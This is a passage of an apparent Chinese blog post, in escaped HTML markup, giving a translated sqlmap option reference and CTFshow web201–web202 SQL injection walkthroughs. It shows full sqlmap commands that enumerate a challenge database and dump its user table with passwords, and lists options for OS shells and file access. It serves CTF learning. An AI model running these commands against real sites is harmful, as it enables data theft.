-&lt;td>&lt;code>--stop=LIMITSTOP&lt;/code>&lt;/td>
-&lt;td>转储表时，使用limit语句进行显示，设置limit的第二个参数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--first=FIRSTCHAR&lt;/code>&lt;/td>
-&lt;td>查询时使用的第一个字符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--last=LASTCHAR&lt;/code>&lt;/td>
-&lt;td>查询时使用的最后一个字符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--sql-query=QUERY&lt;/code>&lt;/td>
-&lt;td>执行sql语句&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--sql-shell&lt;/code>&lt;/td>
-&lt;td>使用可交互sql-shell&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--sql-file=SQLFILE&lt;/code>&lt;/td>
-&lt;td>指定执行sql语句的文件&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="暴力破解选项">暴力破解选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来设置暴力破解参数&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--common-tables&lt;/code>&lt;/td>
-&lt;td>使用本地表名字典&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--common-columns&lt;/code>&lt;/td>
-&lt;td>使用本地列明字典&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="自定义函数选项">自定义函数选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来生成和运行自定义函数&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--udf-inject&lt;/code>&lt;/td>
-&lt;td>注入自定义函数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--shared-lib=SHLIB&lt;/code>&lt;/td>
-&lt;td>指定本地函数共享库&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="文件系统访问选项">文件系统访问选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来设置目标系统的文件系统访问参数&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--file-read=FILE..&lt;/code>&lt;/td>
-&lt;td>从目标系统的文件系统读入文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--file-write=FIL..&lt;/code>&lt;/td>
-&lt;td>向目标系统的文件系统写入文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--file-dest=FILE..&lt;/code>&lt;/td>
-&lt;td>要写入文件的绝对路径&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="操作系统访问选项">操作系统访问选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来设置对目标操作系统的访问参数&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--os-cmd=OSCMD&lt;/code>&lt;/td>
-&lt;td>执行操作系统命令&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--os-shell&lt;/code>&lt;/td>
-&lt;td>反弹操作系统的shell&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--os-pwn&lt;/code>&lt;/td>
-&lt;td>反弹OOBshell, Meterpreter 或 VNC&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--os-smbrelay&lt;/code>&lt;/td>
-&lt;td>一键反弹 OOB shell, Meterpreter or VNC&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--os-bof&lt;/code>&lt;/td>
-&lt;td>保存缓冲器溢出攻击载荷&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--priv-esc&lt;/code>&lt;/td>
-&lt;td>数据库账户提权&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--msf-path=MSFPATH&lt;/code>&lt;/td>
-&lt;td>Metasploit Framework本地安装路径&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--tmp-path=TMPPATH&lt;/code>&lt;/td>
-&lt;td>远程临时文件存放的绝对路径&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="windows注册表访问选项">Windows注册表访问选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来设置Windows系统的注册表访问参数&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>--reg-read&lt;/code>&lt;/td>
-&lt;td>读取注册表的指定键值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--reg-add&lt;/code>&lt;/td>
-&lt;td>向注册表写入指定键值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--reg-del&lt;/code>&lt;/td>
-&lt;td>删除之策表指定键值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--reg-key=REGKEY&lt;/code>&lt;/td>
-&lt;td>设置注册表的键名&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--reg-value=REGVAL&lt;/code>&lt;/td>
-&lt;td>设置注册表的键值&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--reg-data=REGDATA&lt;/code>&lt;/td>
-&lt;td>设置注册表的键数据&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--reg-type=REGTYPE&lt;/code>&lt;/td>
-&lt;td>设置注册表的键类型&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="公共选项">公共选项:
-&lt;/h3>&lt;p>&lt;em>下面的选项用来设置公共参数&lt;/em>&lt;/p>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-s SESSIONFILE&lt;/code>&lt;/td>
-&lt;td>载入测试会话文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>-t TRAFFICFILE&lt;/code>&lt;/td>
-&lt;td>记录所有的HTTP测试结果至文本文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--answers=ANSWERS&lt;/code>&lt;/td>
-&lt;td>设置默认回应 例如 quit=N,follow=N&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--base64=BASE64P..&lt;/code>&lt;/td>
-&lt;td>设置参数包含base64数据&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--batch&lt;/code>&lt;/td>
-&lt;td>静默执行，使用默认选项进行&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--binary-fields=..&lt;/code>&lt;/td>
-&lt;td>返回结果包含二进制数据&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--check-internet&lt;/code>&lt;/td>
-&lt;td>进行注入测试前，检查网络联通情况&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--crawl=CRAWLDEPTH&lt;/code>&lt;/td>
-&lt;td>对指定地址爬虫测试&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--crawl-exclude=..&lt;/code>&lt;/td>
-&lt;td>对匹配正则表达式的页面地址进行爬虫测试&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--csv-del=CSVDEL&lt;/code>&lt;/td>
-&lt;td>设置csv格式的分割符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--charset=CHARSET&lt;/code>&lt;/td>
-&lt;td>设置盲注测试字符集 例如：0123456789abcdef&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dump-format=DU..&lt;/code>&lt;/td>
-&lt;td>对转储文件进行转换 例如：CSV(默认), HTML 或SQLITE&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--encoding=ENCOD..&lt;/code>&lt;/td>
-&lt;td>设置检索时的字符集 例如：GBK&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--eta&lt;/code>&lt;/td>
-&lt;td>显示输出耗时&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--flush-session&lt;/code>&lt;/td>
-&lt;td>刷新当前目标地址的会话&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--forms&lt;/code>&lt;/td>
-&lt;td>对目标地址提交表单测试&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--fresh-queries&lt;/code>&lt;/td>
-&lt;td>忽略已缓存的查询结果&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--har=HARFILE&lt;/code>&lt;/td>
-&lt;td>保存所有HTTP响应至HAR文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--hex&lt;/code>&lt;/td>
-&lt;td>检索返回数据时使用16进制&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--output-dir=OUT..&lt;/code>&lt;/td>
-&lt;td>自定义输出文件路径&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--parse-errors&lt;/code>&lt;/td>
-&lt;td>显示页面上的数据库错误&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--preprocess=PRE..&lt;/code>&lt;/td>
-&lt;td>使用指定脚本提交请求&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--postprocess=PO..&lt;/code>&lt;/td>
-&lt;td>使用指定脚本处理请求响应&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--repair&lt;/code>&lt;/td>
-&lt;td>转储未知字符时，使用的替换字符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--save=SAVECONFIG&lt;/code>&lt;/td>
-&lt;td>将当前的配置保存至配置文件&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--scope=SCOPE&lt;/code>&lt;/td>
-&lt;td>使用正则表达式匹配代理地址列表&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--test-filter=TE..&lt;/code>&lt;/td>
-&lt;td>选择标题且(或)为指定字符串的攻击载荷&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--test-skip=TEST..&lt;/code>&lt;/td>
-&lt;td>忽略标题且(或)为指定字符串的攻击载荷&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--update&lt;/code>&lt;/td>
-&lt;td>更新 sqlmap&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="其他选项">其他选项:
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>选项&lt;/th>
-&lt;th>说明&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>-z MNEMONICS&lt;/code>&lt;/td>
-&lt;td>使用助记符 例如：flu,bat,ban,tec=EU&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--alert=ALERT&lt;/code>&lt;/td>
-&lt;td>注测测试成功执行的本地系统命令&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--beep&lt;/code>&lt;/td>
-&lt;td>注入点测试成功主板蜂鸣&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--cleanup&lt;/code>&lt;/td>
-&lt;td>使用自定义函数情况数据库&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--dependencies&lt;/code>&lt;/td>
-&lt;td>检查sqlmap的组件完整性&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--disable-coloring&lt;/code>&lt;/td>
-&lt;td>关闭彩色输出&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--gpage=GOOGLEPAGE&lt;/code>&lt;/td>
-&lt;td>谷歌傻瓜式注入扫描的页数&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--identify-waf&lt;/code>&lt;/td>
-&lt;td>Make a thorough testing for a WAF/IPS protection&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--list-tampers&lt;/code>&lt;/td>
-&lt;td>显示篡改脚本列表&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--mobile&lt;/code>&lt;/td>
-&lt;td>使用手机UA&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--offline&lt;/code>&lt;/td>
-&lt;td>离线模式&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--purge&lt;/code>&lt;/td>
-&lt;td>安全卸载所有sqlmap内容&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--skip-waf&lt;/code>&lt;/td>
-&lt;td>放弃测试具有启发式WAF保护的地址&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--smart&lt;/code>&lt;/td>
-&lt;td>检测是否时启发式WAF保护&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--sqlmap-shell&lt;/code>&lt;/td>
-&lt;td>反弹sqlmap的shell&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--tmp-dir=TMPDIR&lt;/code>&lt;/td>
-&lt;td>设置sqlmap本地临时文件路径&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--web-root=WEBROOT&lt;/code>&lt;/td>
-&lt;td>设置http服务的网页根目录 例如：/var/www&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>--wizard&lt;/code>&lt;/td>
-&lt;td>使用sqlmao时开启简单向导&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;blockquote>
-&lt;p>CTFshow-大菜鸡 于 2020-11-14 夜完成&lt;/p>&lt;/blockquote>
-&lt;p>常用的命令将会在例题中出现，其中最常用的应该是利用数据包来完成注入&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;span class="lnt">5
-&lt;/span>&lt;span class="lnt">6
-&lt;/span>&lt;span class="lnt">7
-&lt;/span>&lt;span class="lnt">8
-&lt;/span>&lt;span class="lnt">9
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/login.php&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">example.com&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">en-US,en;q=0.5&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/x-www-form-urlencoded&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">25&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">username=admin&amp;amp;password=test
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>对&lt;code>username&lt;/code>参数进行注入，运行命令&lt;code>python sqlmap.py -r request.txt -p username&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/api/?id=1111&amp;amp;page=1&amp;amp;limit=10&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec-Ch-Ua-Platform&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">&amp;#34;Windows&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">X-Requested-With&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">XMLHttpRequest&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json, text/javascript, */*; q=0.01&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec-Ch-Ua&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">&amp;#34;Google Chrome&amp;#34;;v=&amp;#34;135&amp;#34;, &amp;#34;Not-A.Brand&amp;#34;;v=&amp;#34;8&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;135&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec-Ch-Ua-Mobile&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">?0&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec-Fetch-Site&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">same-origin&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec-Fetch-Mode&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">cors&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Sec-Fetch-Dest&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">empty&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">https://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/sqlmap.php&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Priority&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">u=1, i&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>对&lt;code>id&lt;/code>进行参数注入，&lt;code>python sqlmap.py -r request.txt -p id&lt;/code>，还有就是代理到bp，看Ta发的包，参数为&lt;code>--proxy=&amp;quot;http://127.0.0.1:8080&amp;quot;&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-201632.jpg"
-width="1266"
-height="680"
-srcset="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-201632_hu_b695a96c83dec5a6.jpg 480w, https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-201632_hu_60c2e442aa02e0f5.jpg 1024w"
-loading="lazy"
-alt="1"
-class="gallery-image"
-data-flex-grow="186"
-data-flex-basis="446px"
->&lt;/p>
-&lt;h2 id="例题">例题
-&lt;/h2>&lt;h3 id="web201">web201
-&lt;/h3>&lt;p>说了要指定UA头和referer&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-160727.jpg"
-width="2277"
-height="885"
-srcset="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-160727_hu_5f3f5d7c5a4879c4.jpg 480w, https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-160727_hu_efd8449bd66bf1eb.jpg 1024w"
-loading="lazy"
-alt="1"
-class="gallery-image"
-data-flex-grow="257"
-data-flex-basis="617px"
->&lt;/p>
-&lt;p>确认注入类型，然后就梭哈就完事了&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --dbs
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_user --columns
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_user --dump
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_user -C id,username,pass --dump
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://6c4586c9-e3cd-422d-81b4-edd84f668efb.challenge.ctf.show/api/?id=1&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web202">web202
-&lt;/h3>&lt;p>虽然参数是GET参数，但是就是要使用data来传参&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;span class="lnt">5
